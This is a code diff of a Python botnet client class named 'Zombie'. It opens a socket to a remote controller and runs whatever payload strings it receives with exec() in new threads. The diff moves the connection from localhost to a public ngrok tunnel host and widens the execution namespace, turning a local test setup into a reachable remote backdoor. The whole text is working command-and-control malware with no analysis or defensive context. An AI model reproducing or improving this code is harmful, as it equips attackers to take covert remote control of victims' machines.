@@ -1,12 +1,12 @@
 import base64, socket, threading
-import time
+import time, random
 
 class Zombie:
     def __init__(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     def connect_socket(self):
-        self.sock.connect(('127.0.0.1', 56255))
+        self.sock.connect(('2.tcp.ngrok.io', 10142))
 
     def send_packet(self, content: str):
         try:
@@ -17,7 +17,7 @@ class Zombie:
 
     def recv_packet(self):
         try:
-            data = self.sock.recv(2048).decode('utf-8').strip().split('\n')[0]
+            data = self.sock.recv(4096).decode('utf-8').strip().split('\n')[0]
         
             if data not in ['']:
                 return data
@@ -26,7 +26,7 @@ class Zombie:
             return False
 
     def exec_payload(self, payload: str):
-        threading.Thread(target= exec, args=(payload, {'threading': threading, 'socket': socket, 'time': time})).start()
+        threading.Thread(target= exec, args=(payload, {'threading': threading, 'socket': socket, 'time': time, 'random': random})).start()
 
     def run(self):
         self.connect_socket()
